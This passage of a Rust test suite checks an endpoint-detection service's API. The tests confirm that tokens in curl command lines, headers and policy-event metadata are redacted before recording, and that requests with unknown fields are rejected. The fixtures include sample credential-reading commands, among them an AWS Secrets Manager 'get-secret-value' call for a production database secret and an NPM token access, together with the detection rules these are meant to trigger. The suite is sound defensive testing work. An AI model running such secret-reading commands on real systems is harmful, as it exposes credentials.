            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[3], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_proxy_authorization_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-proxy-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Proxy-Authorization: Basic MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Proxy-Authorization:".to_string(),
                    "Basic".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build proxy authorization findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("proxy authorization findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Proxy-Authorization: Basic [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[3], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_proxy_authorization_header_without_scheme_before_recording()
    {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-proxy-auth-no-scheme-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Proxy-Authorization: MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Proxy-Authorization:".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build proxy authorization no-scheme findings request: {e}")
            });

        let response = app.oneshot(req).await.unwrap_or_else(|e| {
            panic!("proxy authorization no-scheme findings request failed: {e}")
        });
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Proxy-Authorization: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_single_arg_authorization_header_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-single-arg-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization:Bearer MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization: Bearer MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build single-arg authorization findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("single-arg authorization findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization: Bearer [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[1], "Authorization: Bearer [REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_authorization_assignment_scheme_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-auth-assignment-scheme-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization=Bearer MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization=Bearer".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build authorization assignment findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("authorization assignment findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization=Bearer [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[1], "Authorization=Bearer");
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_policy_decision_target_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-policy-target-redaction-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PolicyDecision {
                action: "tool_call".to_string(),
                target: Some(
                    "curl -H Authorization: Bearer MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                decision: "block".to_string(),
                guard: Some("test_guard".to_string()),
                severity: Some("critical".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build policy-decision-target findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy-decision-target findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        let EndpointEvent::PolicyDecision { target, .. } = stored.event else {
            panic!("stored observation should remain policy_decision");
        };
        assert_eq!(
            target.as_deref(),
            Some("curl -H Authorization: Bearer [REDACTED] https://api.example.invalid")
        );

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_policy_events_convert_to_observations_findings_and_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[48u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-policy-event-signer".to_string(),
            signer_public_key,
        }));
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/policy-events",
                post(agent_edr_policy_events),
            )
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .with_state(Arc::new(state));
        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "policy-secret-1",
                    "eventType": "secret_access",
                    "timestamp": chrono::Utc::now().to_rfc3339(),
                    "sessionId": "policy-session-1",
                    "data": {
                        "type": "secret",
                        "secretName": "NPM_TOKEN",
                        "scope": "npm_registry"
                    },
                    "metadata": {
                        "apiToken": "MY_RAW_SECRET",
                        "headers": {
                            "authorization": "Bearer MY_RAW_SECRET"
                        },
                        "process": {
                            "pid": 91,
                            "image": "/usr/local/bin/node",
                            "commandLine": "node install.js --token=MY_RAW_SECRET",
                            "processGuid": "proc-policy-events-1"
                        }
                    },
                    "context": {
                        "endpoint_id": "endpoint-policy-test",
                        "identity": {
                            "id": "alice"
                        },
                        "metadata": {
                            "runtimeAgentId": "agent-policy-route",
                            "approvalRequestId": "approval-policy-route",
                            "policyEpoch": 42
                        }
                    }
                },
                {
                    "eventId": "policy-cloud-1",
                    "eventType": "command_exec",
                    "timestamp": chrono::Utc::now().to_rfc3339(),
                    "sessionId": "policy-session-1",
                    "data": {
                        "type": "command",
                        "command": "/opt/homebrew/bin/aws",
                        "args": ["secretsmanager", "get-secret-value", "--secret-id", "prod/db", "--token", "MY_RAW_SECRET"]
                    },
                    "metadata": {
                        "hostId": "endpoint-policy-test",
                        "userId": "alice",
                        "apiToken": "MY_RAW_SECRET",
                        "process": {
                            "pid": 92,
                            "image": "/opt/homebrew/bin/aws",
                            "commandLine": "aws secretsmanager get-secret-value --secret-id prod/db --token=MY_RAW_SECRET",
                            "processGuid": "proc-policy-events-2"
                        }
                    }
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/policy-events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy-events EDR request: {e}"));

        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy-events EDR request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy-events EDR response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy-events EDR response: {e}"));

        assert_eq!(payload["policy_event_count"], 2);
        assert_eq!(payload["observation_count"], 2);
        assert_eq!(payload["finding_count"], 2);
        assert_eq!(payload["receipt_count"], 4);
        assert_eq!(
            payload["observation_receipts"].as_array().map(Vec::len),
            Some(2)
        );
        assert_eq!(
            payload["observations"][0]["event"]["type"],
            "credential_access"
        );
        assert_eq!(payload["observations"][0]["hostId"], "endpoint-policy-test");
        assert_eq!(payload["observations"][0]["userId"], "alice");
        assert_eq!(
            payload["observations"][0]["metadata"]["agentId"],
            "agent-policy-route"
        );
        assert_eq!(
            payload["observations"][0]["metadata"]["approvalId"],
            "approval-policy-route"
        );
        assert_eq!(payload["observations"][0]["metadata"]["policyEpoch"], 42);
        assert_eq!(
            payload["observations"][0]["metadata"]["apiToken"],
            "[REDACTED]"
        );
        assert_eq!(
            payload["observations"][0]["metadata"]["headers"]["authorization"],
            "[REDACTED]"
        );
        assert_eq!(
            payload["observations"][0]["process"]["commandLine"],
            "node install.js --token=[REDACTED]"
        );
        assert_eq!(payload["observations"][1]["event"]["args"][4], "--token");
        assert_eq!(payload["observations"][1]["event"]["args"][5], "[REDACTED]");
        assert_eq!(
            payload["observations"][1]["process"]["commandLine"],
            "aws secretsmanager get-secret-value --secret-id prod/db --token=[REDACTED]"
        );
        assert_eq!(
            payload["observations"][1]["metadata"]["apiToken"],
            "[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
        let rule_ids = payload["findings"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy-event findings"))
            .iter()
            .filter_map(|finding| finding["ruleId"].as_str())
            .collect::<Vec<_>>();
        assert!(rule_ids.contains(&"supply_chain.developer_secret_access"));
        assert!(rule_ids.contains(&"supply_chain.cloud_cli_sensitive_operation"));

        let cloud_finding_id = payload["findings"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy-event findings"))
            .iter()
            .find(|finding| finding["ruleId"] == "supply_chain.cloud_cli_sensitive_operation")
            .and_then(|finding| finding["findingId"].as_str())
            .unwrap_or_else(|| panic!("missing cloud CLI policy-event finding id"));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=detection&ruleId=supply_chain.cloud_cli_sensitive_operation&findingId={cloud_finding_id}&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build policy-event receipt query: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy-event receipt query failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy-event receipt query response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode policy-event receipt query response: {e}")
        });
        assert_eq!(payload["receipt_count"], 1);

        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_ingress_requests_reject_unknown_fields() {
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/policy-events",
                post(agent_edr_policy_events),
            )
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .route(
                "/api/v1/agent/edr/package-manager/events",
                post(agent_edr_package_manager_events),
            )
            .route(
                "/api/v1/agent/edr/endpoint-security/events",
                post(agent_edr_endpoint_security_events),
            )
            .route(
                "/api/v1/agent/edr/network-extension/events",
                post(agent_edr_network_extension_events),
            )
            .with_state(Arc::new(test_state()));

        for (uri, body, field) in [
            (
                "/api/v1/agent/edr/findings",
                serde_json::json!({
                    "observations": [],
                    "shadowFindingEnvelope": true
                }),
                "shadowFindingEnvelope",
            ),
            (
                "/api/v1/agent/edr/policy-events",
                serde_json::json!({
                    "events": [],
                    "shadowPolicyEventEnvelope": true
                }),
                "shadowPolicyEventEnvelope",
            ),
            (
                "/api/v1/agent/edr/developer-activity",
                serde_json::json!({
                    "activities": [],
                    "shadowDeveloperEnvelope": true
                }),
                "shadowDeveloperEnvelope",
            ),
            (
                "/api/v1/agent/edr/developer-activity",
                serde_json::json!({
                    "activities": [
                        {
                            "kind": "mcp_tool",
                            "shadowActivityField": true
                        }
                    ]
                }),
                "shadowActivityField",
            ),
            (
                "/api/v1/agent/edr/package-manager/events",
                serde_json::json!({
                    "events": [
                        {
                            "manager": "npm",
                            "phase": "postinstall",
                            "script": "echo ok",
                            "shadowPackageField": true
                        }
                    ]
                }),
                "shadowPackageField",
            ),
            (
                "/api/v1/agent/edr/endpoint-security/events",
                serde_json::json!({
                    "events": [
                        {
                            "kind": "file_access",
                            "shadowEndpointSecurityField": true
                        }
                    ]
                }),
                "shadowEndpointSecurityField",
            ),
            (
                "/api/v1/agent/edr/network-extension/events",
                serde_json::json!({
                    "events": [
                        {
                            "port": 443,
                            "verdict": "allow",
                            "shadowNetworkExtensionField": true
                        }
                    ]
                }),
                "shadowNetworkExtensionField",
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("POST")
                .uri(uri)
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| {
                    panic!("failed to build unknown-field EDR ingress request: {e}")
                });
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("unknown-field EDR ingress request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read unknown-field EDR ingress error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("unknown-field EDR ingress error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::UNPROCESSABLE_ENTITY,
                "unexpected status for {uri}: {error}"
            );
            assert!(
                error.contains("unknown field") && error.contains(field),
                "unexpected unknown-field error for {uri}: {error}"
            );
        }
    }

